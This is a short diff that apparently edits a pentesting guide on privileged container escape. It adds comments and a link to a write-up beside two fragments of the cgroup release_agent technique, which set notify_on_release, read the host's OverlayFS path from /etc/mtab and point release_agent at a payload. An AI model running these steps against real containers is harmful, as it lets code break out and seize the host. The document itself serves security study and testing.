@@ -20,6 +20,8 @@ d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 # Enables notify_on_release in the cgroup
 mkdir -p $d/w; echo 1 > $d/w/notify_on_release
 # Finds path of OverlayFS mount for container
+# Unless the configuration explicitly exposes the mount point of the host filesystem
+# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 # Sets release_agent to /path/payload
 touch /o; echo $t/c > $d/release_agent
@@ -72,6 +74,8 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 # Enables cgroup notifications on release of the "x" cgroup
 echo 1 > /tmp/cgrp/x/notify_on_release
 # Finds path of OverlayFS mount for container
+# Unless the configuration explicitly exposes the mount point of the host filesystem
+# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 # Sets release_agent to /path/payload
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
